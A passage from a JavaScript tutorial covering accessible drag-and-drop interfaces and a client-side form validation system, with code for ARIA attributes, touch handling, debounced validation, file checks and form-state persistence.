    document.addEventListener('pointerup', this.boundHandleUp);
  }
  
  endDrag() {
    document.removeEventListener('pointermove', this.boundHandleMove);
    document.removeEventListener('pointerup', this.boundHandleUp);
    // Clear references
    this.draggedElement = null;
    this.lastPosition = null;
  }
}
```

**WeakMap for element data:**

```javascript
const dragData = new WeakMap();

function storeDragData(element, data) {
  dragData.set(element, data);
  // Automatically cleaned up when element is garbage collected
}
```

### Accessibility

#### Keyboard Navigation

Drag interfaces must be keyboard-accessible:

```javascript
element.addEventListener('keydown', (e) => {
  if (e.key === ' ' || e.key === 'Enter') {
    toggleDragMode(element);
  }
  
  if (inDragMode) {
    switch(e.key) {
      case 'ArrowUp':
        moveElement(element, 0, -gridSize);
        break;
      case 'ArrowDown':
        moveElement(element, 0, gridSize);
        break;
      case 'ArrowLeft':
        moveElement(element, -gridSize, 0);
        break;
      case 'ArrowRight':
        moveElement(element, gridSize, 0);
        break;
      case 'Escape':
        cancelDrag();
        break;
    }
    e.preventDefault();
  }
});
```

#### ARIA Attributes

**Draggable items:**

```javascript
element.setAttribute('role', 'button');
element.setAttribute('aria-pressed', 'false');
element.setAttribute('aria-describedby', 'drag-instructions');
element.setAttribute('tabindex', '0');
```

**Drop zones:**

```javascript
dropZone.setAttribute('role', 'region');
dropZone.setAttribute('aria-label', 'Drop zone for items');
dropZone.setAttribute('aria-dropeffect', 'move');
```

**Live region announcements:**

```javascript
const announcer = document.createElement('div');
announcer.setAttribute('role', 'status');
announcer.setAttribute('aria-live', 'assertive');
announcer.setAttribute('aria-atomic', 'true');
announcer.className = 'sr-only';
document.body.appendChild(announcer);

function announce(message) {
  announcer.textContent = message;
  setTimeout(() => announcer.textContent = '', 1000);
}

// Usage
announce('Item moved to position 3 of 10');
```

#### Focus Management

```javascript
function handleDrop(draggedElement, targetIndex) {
  // Perform reordering
  reorderElements(draggedElement, targetIndex);
  
  // Return focus to dragged element in new position
  draggedElement.focus();
  
  // Announce change
  announce(`Moved to position ${targetIndex + 1} of ${totalItems}`);
}
```

### Multi-Selection Drag

#### Selection Management

```javascript
const selected = new Set();

function handleClick(e, element) {
  if (e.ctrlKey || e.metaKey) {
    toggleSelection(element);
  } else if (e.shiftKey && lastSelected) {
    selectRange(lastSelected, element);
  } else {
    clearSelection();
    selectElement(element);
  }
  lastSelected = element;
}

function selectElement(element) {
  selected.add(element);
  element.classList.add('selected');
  element.setAttribute('aria-selected', 'true');
}

function selectRange(start, end) {
  const items = Array.from(container.children);
  const startIdx = items.indexOf(start);
  const endIdx = items.indexOf(end);
  
  const [first, last] = startIdx < endIdx ? 
    [startIdx, endIdx] : [endIdx, startIdx];
  
  for (let i = first; i <= last; i++) {
    selectElement(items[i]);
  }
}
```

#### Ghost Element for Multiple Items

```javascript
function createMultiDragGhost(selectedElements) {
  const ghost = document.createElement('div');
  ghost.className = 'multi-drag-ghost';
  
  // Show count
  const badge = document.createElement('span');
  badge.className = 'count-badge';
  badge.textContent = selectedElements.size;
  ghost.appendChild(badge);
  
  // Show preview of first item
  const preview = selectedElements.values().next().value.cloneNode(true);
  preview.style.opacity = '0.8';
  ghost.appendChild(preview);
  
  document.body.appendChild(ghost);
  return ghost;
}
```

#### Batch Operations

```javascript
function handleMultiDrop(selectedElements, targetIndex) {
  // Get original indices
  const items = Array.from(container.children);
  const indices = Array.from(selectedElements).map(el => items.indexOf(el));
  indices.sort((a, b) => a - b);
  
  // Adjust target index for removed elements before it
  const adjustedTarget = targetIndex - indices.filter(i => i < targetIndex).length;
  
  // Remove all selected elements
  const elements = indices.map(i => items[i]);
  elements.forEach(el => el.remove());
  
  // Insert at target
  const referenceNode = container.children[adjustedTarget];
  elements.forEach(el => {
    if (referenceNode) {
      container.insertBefore(el, referenceNode);
    } else {
      container.appendChild(el);
    }
  });
}
```

### Touch-Specific Patterns

#### Long-Press to Initiate

```javascript
let longPressTimer = null;
const longPressDuration = 500;

element.addEventListener('touchstart', (e) => {
  longPressTimer = setTimeout(() => {
    startDrag(e);
    navigator.vibrate && navigator.vibrate(50); // Haptic feedback
  }, longPressDuration);
});

element.addEventListener('touchmove', () => {
  clearTimeout(longPressTimer);
});

element.addEventListener('touchend', () => {
  clearTimeout(longPressTimer);
});
```

#### Preventing Scroll During Drag

```javascript
function preventScrollDuringDrag(element) {
  let isDragging = false;
  
  element.addEventListener('touchstart', (e) => {
    isDragging = true;
  }, { passive: false });
  
  element.addEventListener('touchmove', (e) => {
    if (isDragging) {
      e.preventDefault(); // Prevents scroll
    }
  }, { passive: false });
  
  element.addEventListener('touchend', () => {
    isDragging = false;
  });
}
```

Note: `{ passive: false }` is required to call `preventDefault()` on touch events.

#### Touch-Specific Visual Feedback

```javascript
element.addEventListener('touchstart', () => {
  element.classList.add('touch-active');
  // Slightly scale up
  element.style.transform = 'scale(1.05)';
});

element.addEventListener('touchend', () => {
  element.classList.remove('touch-active');
  element.style.transform = '';
});
```

### Canvas-Based Drag Systems

For high-performance dragging with many elements (>1000), Canvas rendering outperforms DOM.

#### Hit Detection

```javascript
class CanvasDragManager {
  constructor(canvas) {
    this.canvas = canvas;
    this.ctx = canvas.getContext('2d');
    this.elements = [];
  }
  
  findElementAt(x, y) {
    // Iterate in reverse (top to bottom)
    for (let i = this.elements.length - 1; i >= 0; i--) {
      const el = this.elements[i];
      if (x >= el.x && x <= el.x + el.width &&
          y >= el.y && y <= el.y + el.height) {
        return el;
      }
    }
    return null;
  }
  
  handleMouseDown(e) {
    const rect = this.canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    
    this.draggedElement = this.findElementAt(x, y);
    if (this.draggedElement) {
      this.offsetX = x - this.draggedElement.x;
      this.offsetY = y - this.draggedElement.y;
    }
  }
  
  handleMouseMove(e) {
    if (!this.draggedElement) return;
    
    const rect = this.canvas.getBoundingClientRect();
    this.draggedElement.x = e.clientX - rect.left - this.offsetX;
    this.draggedElement.y = e.clientY - rect.top - this.offsetY;
    
    this.render();
  }
  
  render() {
    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
    this.elements.forEach(el => this.drawElement(el));
  }
}
```

#### Pixel-Perfect Hit Detection

For complex shapes, use off-screen canvas color-coding:

```javascript
class PixelHitDetection {
  constructor(mainCanvas) {
    this.mainCanvas = mainCanvas;
    this.hitCanvas = document.createElement('canvas');
    this.hitCanvas.width = mainCanvas.width;
    this.hitCanvas.height = mainCanvas.height;
    this.hitCtx = this.hitCanvas.getContext('2d');
    this.colorToElement = new Map();
  }
  
  register(element)
```

---

## Form Validation System (DOM/JS)

### Validation Timing Strategies

#### On Submit Validation

Validates all fields when the form is submitted. Prevents submission if validation fails by calling `event.preventDefault()`. This approach minimizes interruptions during data entry but delays error feedback until the user attempts to submit.

```javascript
form.addEventListener('submit', (e) => {
  e.preventDefault();
  if (validateForm()) {
    form.submit();
  }
});
```

#### On Blur Validation

Validates individual fields when they lose focus. Provides immediate feedback after the user completes a field without interrupting active typing. Common pattern for progressive validation.

```javascript
input.addEventListener('blur', () => {
  validateField(input);
});
```

#### On Input Validation

Validates as the user types. Provides real-time feedback but can be intrusive. Often combined with debouncing to reduce validation frequency.

```javascript
input.addEventListener('input', debounce(() => {
  validateField(input);
}, 300));
```

#### Hybrid Approaches

Combines multiple timing strategies. Common pattern: validate on blur for initial feedback, then switch to on-input validation after first error to help user correct issues in real-time.

### Validation Rule Implementation

#### Built-in HTML5 Validation

Native browser validation using HTML attributes. Limited customization but zero JavaScript required.

```javascript
// Accessing validation state
input.validity.valueMissing // required field is empty
input.validity.typeMismatch // type doesn't match (email, url, etc.)
input.validity.patternMismatch // doesn't match pattern attribute
input.validity.tooLong // exceeds maxlength
input.validity.tooShort // below minlength
input.validity.rangeUnderflow // below min
input.validity.rangeOverflow // above max
input.validity.stepMismatch // doesn't match step attribute
input.validity.valid // overall validity
input.validationMessage // browser's error message
```

Disable default UI and handle manually:

```javascript
form.noValidate = true; // or <form novalidate> in HTML
```

#### Custom Validation Rules

Object-based validation configuration:

```javascript
const rules = {
  username: {
    required: true,
    minLength: 3,
    maxLength: 20,
    pattern: /^[a-zA-Z0-9_]+$/,
    custom: (value) => {
      if (value.includes('admin')) {
        return 'Username cannot contain "admin"';
      }
      return true;
    }
  },
  email: {
    required: true,
    type: 'email',
    custom: async (value) => {
      // [Inference] Async validation typically checks server-side constraints
      const available = await checkEmailAvailability(value);
      return available || 'Email already registered';
    }
  }
};
```

#### Validation Function Patterns

**Synchronous validation:**

```javascript
function validateField(input, rule) {
  const value = input.value.trim();
  
  if (rule.required && !value) {
    return { valid: false, message: 'This field is required' };
  }
  
  if (rule.minLength && value.length < rule.minLength) {
    return { 
      valid: false, 
      message: `Minimum ${rule.minLength} characters required` 
    };
  }
  
  if (rule.pattern && !rule.pattern.test(value)) {
    return { valid: false, message: 'Invalid format' };
  }
  
  if (rule.custom) {
    const result = rule.custom(value);
    if (result !== true) {
      return { valid: false, message: result };
    }
  }
  
  return { valid: true, message: '' };
}
```

**Asynchronous validation:**

```javascript
async function validateFieldAsync(input, rule) {
  const syncResult = validateField(input, rule);
  if (!syncResult.valid) return syncResult;
  
  if (rule.custom && rule.custom.constructor.name === 'AsyncFunction') {
    const result = await rule.custom(input.value);
    if (result !== true) {
      return { valid: false, message: result };
    }
  }
  
  return { valid: true, message: '' };
}
```

### Error Display Mechanisms

#### Inline Error Messages

Displays errors adjacent to the invalid field. Most common pattern for immediate, contextual feedback.

```javascript
function showError(input, message) {
  const errorElement = input.nextElementSibling;
  if (errorElement?.classList.contains('error-message')) {
    errorElement.textContent = message;
    errorElement.style.display = 'block';
  }
  input.classList.add('invalid');
  input.setAttribute('aria-invalid', 'true');
  input.setAttribute('aria-describedby', errorElement.id);
}

function clearError(input) {
  const errorElement = input.nextElementSibling;
  if (errorElement?.classList.contains('error-message')) {
    errorElement.textContent = '';
    errorElement.style.display = 'none';
  }
  input.classList.remove('invalid');
  input.removeAttribute('aria-invalid');
  input.removeAttribute('aria-describedby');
}
```

#### Error Summary

Collects all errors at top of form. Useful for accessibility and long forms.

```javascript
function displayErrorSummary(errors) {
  const summary = document.getElementById('error-summary');
  summary.innerHTML = '<h3>Please correct the following errors:</h3>';
  
  const list = document.createElement('ul');
  errors.forEach(error => {
    const item = document.createElement('li');
    const link = document.createElement('a');
    link.href = `#${error.fieldId}`;
    link.textContent = error.message;
    link.addEventListener('click', (e) => {
      e.preventDefault();
      document.getElementById(error.fieldId).focus();
    });
    item.appendChild(link);
    list.appendChild(item);
  });
  
  summary.appendChild(list);
  summary.focus();
}
```

#### Tooltip/Popover Errors

Displays errors in floating tooltips. Reduces layout shift but can be obscured or clipped.

```javascript
function showTooltipError(input, message) {
  const tooltip = document.createElement('div');
  tooltip.className = 'error-tooltip';
  tooltip.textContent = message;
  tooltip.id = `${input.id}-error`;
  
  document.body.appendChild(tooltip);
  
  const rect = input.getBoundingClientRect();
  tooltip.style.position = 'absolute';
  tooltip.style.left = `${rect.left}px`;
  tooltip.style.top = `${rect.bottom + 5}px`;
  
  input.setAttribute('aria-describedby', tooltip.id);
}
```

### Validation State Management

#### Field-Level State

Tracks validation state per field:

```javascript
class FormValidator {
  constructor(formElement, rules) {
    this.form = formElement;
    this.rules = rules;
    this.fieldStates = new Map();
    this.touched = new Set();
  }
  
  initField(input) {
    this.fieldStates.set(input.name, {
      valid: true,
      errors: [],
      validated: false,
      validating: false
    });
  }
  
  markTouched(fieldName) {
    this.touched.add(fieldName);
  }
  
  isTouched(fieldName) {
    return this.touched.has(fieldName);
  }
  
  updateFieldState(fieldName, state) {
    const current = this.fieldStates.get(fieldName);
    this.fieldStates.set(fieldName, { ...current, ...state });
  }
  
  getFieldState(fieldName) {
    return this.fieldStates.get(fieldName);
  }
  
  isFormValid() {
    return Array.from(this.fieldStates.values())
      .every(state => state.valid);
  }
}
```

#### Validation Lifecycle

Manages async validation state to prevent race conditions:

```javascript
async function validateWithLoading(input, rule) {
  const fieldName = input.name;
  const validationId = Date.now();
  
  validator.updateFieldState(fieldName, {
    validating: true,
    currentValidationId: validationId
  });
  
  showLoadingIndicator(input);
  
  try {
    const result = await validateFieldAsync(input, rule);
    
    // Check if this is still the current validation
    const state = validator.getFieldState(fieldName);
    if (state.currentValidationId === validationId) {
      validator.updateFieldState(fieldName, {
        valid: result.valid,
        errors: result.valid ? [] : [result.message],
        validated: true,
        validating: false
      });
      
      displayValidationResult(input, result);
    }
  } catch (error) {
    hideLoadingIndicator(input);
    // [Inference] Network or server errors during validation
  }
}
```

### Debouncing and Throttling

#### Debounce Implementation

Delays validation until user stops typing:

```javascript
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

input.addEventListener('input', debounce((e) => {
  validateField(e.target);
}, 300));
```

#### Throttle Implementation

Limits validation frequency regardless of input rate:

```javascript
function throttle(func, limit) {
  let inThrottle;
  return function executedFunction(...args) {
    if (!inThrottle) {
      func(...args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}
```

### Complex Field Dependencies

#### Cross-Field Validation

Validates fields that depend on other field values:

```javascript
function setupDependentValidation(form) {
  const password = form.querySelector('[name="password"]');
  const confirmPassword = form.querySelector('[name="confirmPassword"]');
  
  confirmPassword.addEventListener('input', () => {
    if (confirmPassword.value !== password.value) {
      showError(confirmPassword, 'Passwords must match');
    } else {
      clearError(confirmPassword);
    }
  });
  
  // Re-validate confirm when password changes
  password.addEventListener('input', () => {
    if (validator.isTouched('confirmPassword')) {
      confirmPassword.dispatchEvent(new Event('input'));
    }
  });
}
```

#### Conditional Validation Rules

Changes validation requirements based on other field values:

```javascript
function getConditionalRules(fieldName, formData) {
  const baseRules = rules[fieldName];
  
  if (fieldName === 'companyName') {
    // Only required if accountType is 'business'
    return {
      ...baseRules,
      required: formData.accountType === 'business'
    };
  }
  
  if (fieldName === 'vatNumber') {
    return {
      ...baseRules,
      required: formData.country === 'GB' && formData.accountType === 'business'
    };
  }
  
  return baseRules;
}
```

### Dynamic Field Validation

#### Adding/Removing Fields

Handles fields added or removed dynamically:

```javascript
class DynamicFormValidator extends FormValidator {
  observeForm() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === 1 && node.matches('input, select, textarea')) {
            this.registerField(node);
          }
        });
        
        mutation.removedNodes.forEach((node) => {
          if (node.nodeType === 1 && node.matches('input, select, textarea')) {
            this.unregisterField(node);
          }
        });
      });
    });
    
    observer.observe(this.form, {
      childList: true,
      subtree: true
    });
  }
  
  registerField(input) {
    this.initField(input);
    this.attachListeners(input);
  }
  
  unregisterField(input) {
    this.fieldStates.delete(input.name);
    this.touched.delete(input.name);
  }
}
```

#### Repeating Field Groups

Validates repeated field sets (e.g., multiple addresses):

```javascript
function validateRepeatingGroup(container) {
  const groups = container.querySelectorAll('.address-group');
  const allValid = Array.from(groups).every((group, index) => {
    const fields = group.querySelectorAll('input, select');
    return Array.from(fields).every(field => {
      const fieldName = `${field.name}_${index}`;
      return validateField(field, rules[field.name]).valid;
    });
  });
  
  return allValid;
}
```

### Custom Validation Messages

#### Message Templating

Generates contextual error messages:

```javascript
const messageTemplates = {
  required: (fieldLabel) => `${fieldLabel} is required`,
  minLength: (fieldLabel, min) => `${fieldLabel} must be at least ${min} characters`,
  maxLength: (fieldLabel, max) => `${fieldLabel} cannot exceed ${max} characters`,
  pattern: (fieldLabel, format) => `${fieldLabel} must be a valid ${format}`,
  email: (fieldLabel) => `Please enter a valid email address`,
  custom: (fieldLabel, message) => message
};

function generateMessage(fieldName, validationType, ...params) {
  const fieldLabel = document.querySelector(`label[for="${fieldName}"]`)?.textContent || fieldName;
  return messageTemplates[validationType](fieldLabel, ...params);
}
```

#### Internationalization

Supports multiple languages for validation messages:

```javascript
const messages = {
  en: {
    required: 'This field is required',
    email: 'Please enter a valid email',
    minLength: 'Minimum {min} characters required'
  },
  es: {
    required: 'Este campo es obligatorio',
    email: 'Por favor, introduce un email válido',
    minLength: 'Se requieren mínimo {min} caracteres'
  }
};

function getMessage(key, params = {}, locale = 'en') {
  let message = messages[locale][key] || messages.en[key];
  Object.keys(params).forEach(param => {
    message = message.replace(`{${param}}`, params[param]);
  });
  return message;
}
```

### Accessibility Considerations

#### ARIA Attributes

Proper ARIA implementation for screen readers:

```javascript
function makeFieldAccessible(input, errorElement) {
  // Link error message to input
  errorElement.id = `${input.id}-error`;
  errorElement.setAttribute('role', 'alert');
  errorElement.setAttribute('aria-live', 'polite');
  
  // Mark input as invalid
  input.setAttribute('aria-invalid', 'true');
  input.setAttribute('aria-describedby', errorElement.id);
  
  // Add required indicator
  if (input.hasAttribute('required')) {
    input.setAttribute('aria-required', 'true');
  }
}

function clearAccessibilityAttributes(input) {
  input.setAttribute('aria-invalid', 'false');
  input.removeAttribute('aria-describedby');
}
```

#### Keyboard Navigation

Ensures keyboard users can navigate validation errors:

```javascript
function focusFirstError() {
  const firstError = document.querySelector('[aria-invalid="true"]');
  if (firstError) {
    firstError.focus();
    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }
}

form.addEventListener('submit', (e) => {
  if (!validateForm()) {
    e.preventDefault();
    focusFirstError();
  }
});
```

#### Live Regions

Announces validation changes to screen readers:

```javascript
function announceValidationChange(message) {
  const liveRegion = document.getElementById('validation-announcer');
  if (!liveRegion) {
    const region = document.createElement('div');
    region.id = 'validation-announcer';
    region.setAttribute('role', 'status');
    region.setAttribute('aria-live', 'polite');
    region.setAttribute('aria-atomic', 'true');
    region.className = 'sr-only'; // visually hidden
    document.body.appendChild(region);
  }
  
  liveRegion.textContent = message;
  
  // Clear after announcement
  setTimeout(() => {
    liveRegion.textContent = '';
  }, 1000);
}
```

### Performance Optimization

#### Validation Caching

Caches validation results to avoid redundant checks:

```javascript
class CachedValidator {
  constructor() {
    this.cache = new Map();
  }
  
  getCacheKey(fieldName, value, ruleHash) {
    return `${fieldName}:${value}:${ruleHash}`;
  }
  
  async validate(field, value, rule) {
    const ruleHash = JSON.stringify(rule);
    const cacheKey = this.getCacheKey(field.name, value, ruleHash);
    
    if (this.cache.has(cacheKey)) {
      return this.cache.get(cacheKey);
    }
    
    const result = await validateFieldAsync(field, rule);
    this.cache.set(cacheKey, result);
    
    return result;
  }
  
  invalidateField(fieldName) {
    Array.from(this.cache.keys())
      .filter(key => key.startsWith(`${fieldName}:`))
      .forEach(key => this.cache.delete(key));
  }
}
```

#### Lazy Validation Loading

Defers expensive validations until necessary:

```javascript
const lazyRules = {
  username: {
    immediate: {
      required: true,
      pattern: /^[a-zA-Z0-9_]+$/
    },
    deferred: {
      async checkAvailability(value) {
        // Only runs if immediate validations pass
        return await fetch(`/api/check-username/${value}`);
      }
    }
  }
};

async function validateFieldLazy(input, rules) {
  // Run immediate validations first
  const immediateResult = validateField(input, rules.immediate);
  if (!immediateResult.valid) {
    return immediateResult;
  }
  
  // Only run deferred validations if immediate pass
  if (rules.deferred) {
    return await validateFieldAsync(input, rules.deferred);
  }
  
  return immediateResult;
}
```

#### Batch DOM Updates

Minimizes reflows by batching DOM operations:

```javascript
function updateValidationUI(validationResults) {
  // Read phase - gather all measurements
  const updates = validationResults.map(result => ({
    input: result.input,
    errorElement: result.input.nextElementSibling,
    message: result.message,
    valid: result.valid
  }));
  
  // Write phase - apply all DOM changes
  requestAnimationFrame(() => {
    updates.forEach(update => {
      if (update.valid) {
        update.input.classList.remove('invalid');
        update.errorElement.style.display = 'none';
      } else {
        update.input.classList.add('invalid');
        update.errorElement.textContent = update.message;
        update.errorElement.style.display = 'block';
      }
    });
  });
}
```

### Advanced Pattern Matching

#### Email Validation

Comprehensive email pattern (basic level):

```javascript
const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// [Inference] More strict pattern following RFC 5322 simplified
const strictEmailPattern = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
```

#### Phone Number Validation

Flexible phone number patterns:

```javascript
const phonePatterns = {
  US: /^(\+1)?[-.\s]?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}$/,
  UK: /^(\+44)?[\s]?[0-9]{4}[\s]?[0-9]{6}$/,
  international: /^\+?[1-9]\d{1,14}$/ // E.164 format
};

function validatePhone(value, country = 'international') {
  const pattern = phonePatterns[country] || phonePatterns.international;
  return pattern.test(value);
}
```

#### Credit Card Validation

Luhn algorithm implementation:

```javascript
function validateCreditCard(cardNumber) {
  const digits = cardNumber.replace(/\D/g, '');
  
  if (digits.length < 13 || digits.length > 19) {
    return false;
  }
  
  let sum = 0;
  let isEven = false;
  
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}
```

#### URL Validation

Validates URL structure:

```javascript
function validateURL(value) {
  try {
    const url = new URL(value);
    return ['http:', 'https:'].includes(url.protocol);
  } catch {
    return false;
  }
}

// Pattern-based alternative
const urlPattern = /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$/;
```

### File Input Validation

#### File Type Validation

Validates file extensions and MIME types:

```javascript
function validateFileType(file, allowedTypes) {
  // Check extension
  const extension = file.name.split('.').pop().toLowerCase();
  const allowedExtensions = allowedTypes.map(type => type.split('/')[1]);
  
  if (!allowedExtensions.includes(extension)) {
    return {
      valid: false,
      message: `Only ${allowedExtensions.join(', ')} files are allowed`
    };
  }
  
  // Check MIME type
  if (!allowedTypes.includes(file.type)) {
    return {
      valid: false,
      message: 'Invalid file type'
    };
  }
  
  return { valid: true };
}

fileInput.addEventListener('change', (e) => {
  const file = e.target.files[0];
  if (file) {
    const result = validateFileType(file, ['image/jpeg', 'image/png', 'application/pdf']);
    if (!result.valid) {
      showError(fileInput, result.message);
    }
  }
});
```

#### File Size Validation

Checks file size constraints:

```javascript
function validateFileSize(file, maxSizeMB) {
  const maxSizeBytes = maxSizeMB * 1024 * 1024;
  
  if (file.size > maxSizeBytes) {
    return {
      valid: false,
      message: `File size must not exceed ${maxSizeMB}MB`
    };
  }
  
  return { valid: true };
}
```

#### Image Dimension Validation

Validates image dimensions:

```javascript
function validateImageDimensions(file, constraints) {
  return new Promise((resolve) => {
    const img = new Image();
    const url = URL.createObjectURL(file);
    
    img.onload = () => {
      URL.revokeObjectURL(url);
      
      const { minWidth, maxWidth, minHeight, maxHeight, aspectRatio } = constraints;
      
      if (minWidth && img.width < minWidth) {
        resolve({ valid: false, message: `Width must be at least ${minWidth}px` });
        return;
      }
      
      if (maxWidth && img.width > maxWidth) {
        resolve({ valid: false, message: `Width cannot exceed ${maxWidth}px` });
        return;
      }
      
      if (minHeight && img.height < minHeight) {
        resolve({ valid: false, message: `Height must be at least ${minHeight}px` });
        return;
      }
      
      if (maxHeight && img.height > maxHeight) {
        resolve({ valid: false, message: `Height cannot exceed ${maxHeight}px` });
        return;
      }
      
      if (aspectRatio) {
        const ratio = img.width / img.height;
        const tolerance = 0.01;
        if (Math.abs(ratio - aspectRatio) > tolerance) {
          resolve({ 
            valid: false, 
            message: `Image must have ${aspectRatio}:1 aspect ratio` 
          });
          return;
        }
      }
      
      resolve({ valid: true });
    };
    
    img.onerror = () => {
      URL.revokeObjectURL(url);
      resolve({ valid: false, message: 'Invalid image file' });
    };
    
    img.src = url;
  });
}
```

### Server-Side Validation Integration

#### Async Server Validation

Validates against server-side constraints:

```javascript
async function validateServerSide(fieldName, value) {
  try {
    const response = await fetch('/api/validate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ field: fieldName, value })
    });
    
    const result = await response.json();
    
    return {
      valid: result.valid,
      message: result.message || ''
    };
  } catch (error) {
    return {
      valid: true, // Fail open on network error
      message: ''
    };
  }
}
```

#### Form Submission with Server Validation

Handles server-side validation on submit:

```javascript
async function submitForm(form) {
  // Client-side validation first
  if (!validateForm()) {
    focusFirstError();
    return;
  }
  
  const formData = new FormData(form);
  const submitButton = form.querySelector('[type="submit"]');
  
  submitButton.disabled = true;
  submitButton.textContent = 'Submitting...';
  
  try {
    const response = await fetch(form.action, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    
    if (response.ok) {
      // Success handling
      window.location.href = result.redirectUrl;
    } else {
      // Server validation errors
      displayServerErrors(result.errors);
    }
  } catch (error) {
    showError(form, 'An error occurred. Please try again.');
  } finally {
    submitButton.disabled = false;
    submitButton.textContent = 'Submit';
  }
}

function displayServerErrors(errors) {
  Object.keys(errors).forEach(fieldName => {
    const input = document.querySelector(`[name="${fieldName}"]`);
    if (input) {
      showError(input, errors[fieldName]);
    }
  });
  
  focusFirstError();
}
```

### Form State Persistence

#### localStorage Integration

Saves form state to prevent data loss:

```javascript
class FormStatePersistence {
  constructor(formId) {
    this.formId = formId;
    this.storageKey = `form_state_${formId}`;
  }
  
  save(formData) {
    localStorage.setItem(this.storageKey, JSON.stringify({
      data: formData,
      timestamp: Date.now()
    }));
  }
  
  load() {
    const stored = localStorage.getItem(this.storageKey);
    if (!stored) return null;
    
    const state = JSON.parse(stored);
    const maxAge = 24 * 60 * 60 * 1000; // 24 hours
    
    if (Date.now() - state.timestamp > maxAge) {
      this.clear();
      return null;
    }
    
    return state.data;
  }
  
  clear() {
    localStorage.removeItem(this.storageKey);
  }
}

// Auto-save on input
const persistence = new FormStatePersistence('checkout-form');

form.addEventListener('input', debounce(() => {
  const formData = Object.fromEntries(new FormData(form));
  persistence.save(formData);
}, 1000));

// Restore on page load
window.addEventListener('DOMContentLoaded', () => {
  const savedData = persistence.load();
  if (savedData) {
    Object.keys(savedData).forEach(name => {
      const input = form.querySelector(`[name="${name}"]`);
      if (input) {
        input.value = savedData[name];
      }
    });
  }
});

// Clear on successful submit
form.addEventListener('submit', () => {
  persistence.clear();
});
```

### Complete Validation System Example

Integrated system combining multiple concepts:

```javascript
class ComprehensiveFormValidator {
  constructor(form, config) {
    this.form = form;
    this.rules = config.rules;
    this.messages = config.messages || {};
    this.fieldStates = new Map();
    this.touched = new Set();
    this.validationCache = new Map();
    
    this.init();
  }
  
  init() {
    this.form.noValidate = true;
    
    this.form.querySelectorAll('input, select, textarea').forEach(input => {
      this.initField(input);
      this.attachListeners(input);
    });
    
    this.form.addEventListener('submit', (e) => this.handleSubmit(e));
  }
  
  initField(input) {
    this.fieldStates.set(input.name, {
      valid: true,
      errors: [],
      validated: false,
      validating: false
    });
  }
  
  attachListeners(input) {
    input.addEventListener('blur', () => {
      this.touched.add(input.name);
      this.validateField(input);
    });
    
    input.addEventListener('input', debounce(() => {
      if (this.touched.has(input.name)) {
        this.validateField(input);
      }
    }, 300));
  }
  
async validateField(input) {
    const rule = this.rules[input.name];
    if (!rule) return { valid: true };

    const value = input.value.trim();
    const errors = [];

    // Required validation
    if (rule.required && !value) {
        errors.push(this.getMessage('required', input));
    }

    if (value) {
        // Length validation
        if (rule.minLength && value.length < rule.minLength) {
            errors.push(this.getMessage('minLength', input, rule.minLength));
        }

        if (rule.maxLength && value.length > rule.maxLength) {
            errors.push(this.getMessage('maxLength', input, rule.maxLength));
        }

        // Pattern validation
        if (rule.pattern && !rule.pattern.test(value)) {
            errors.push(this.getMessage('pattern', input));
        }

        // Custom validation
        if (rule.custom) {
            this.fieldStates.get(input.name).validating = true;
            this.showLoadingIndicator(input);

            try {
                const result = await rule.custom(value);
                if (result !== true) {
                    errors.push(result);
                }
            } catch (error) {
                errors.push('Validation failed');
            } finally {
                this.fieldStates.get(input.name).validating = false;
                this.hideLoadingIndicator(input);
            }
        }
    }

    const result = {
        valid: errors.length === 0,
        errors,
    };

    this.fieldStates.set(input.name, {
        ...this.fieldStates.get(input.name),
        valid: result.valid,
        errors: result.errors,
        validated: true,
    });

    this.displayValidationResult(input, result);

    return result;
}

async validateAllFields() {
    const inputs = Array.from(
        this.form.querySelectorAll('input, select, textarea')
    );

    const results = await Promise.all(
        inputs.map(input => this.validateField(input))
    );

    return results.every(result => result.valid);
}

async handleSubmit(e) {
    e.preventDefault();

    // Mark all fields as touched
    this.form
        .querySelectorAll('input, select, textarea')
        .forEach(input => this.touched.add(input.name));

    const isValid = await this.validateAllFields();

    if (isValid) {
        this.form.submit();
    } else {
        this.focusFirstError();
        announceValidationChange(
            'Form has errors. Please correct them and try again.'
        );
    }
}

displayValidationResult(input, result) {
    const errorElement = this.getErrorElement(input);

    if (result.valid) {
        input.classList.remove('invalid');
        input.classList.add('valid');
        input.setAttribute('aria-invalid', 'false');
        errorElement.textContent = '';
        errorElement.style.display = 'none';
    } else {
        input.classList.remove('valid');
        input.classList.add('invalid');
        input.setAttribute('aria-invalid', 'true');
        input.setAttribute('aria-describedby', errorElement.id);
        errorElement.textContent = result.errors[0];
        errorElement.style.display = 'block';
    }
}

getErrorElement(input) {
    let errorElement = input.nextElementSibling;

    if (!errorElement?.classList.contains('error-message')) {
        errorElement = document.createElement('span');
        errorElement.className = 'error-message';
        errorElement.id = `${input.id}-error`;
        errorElement.setAttribute('role', 'alert');
        input.parentNode.insertBefore(errorElement, input.nextSibling);
    }

    return errorElement;
}

getMessage(type, input, param) {
    const fieldLabel = this.getFieldLabel(input);
    const customMessage = this.messages[input.name]?.[type];

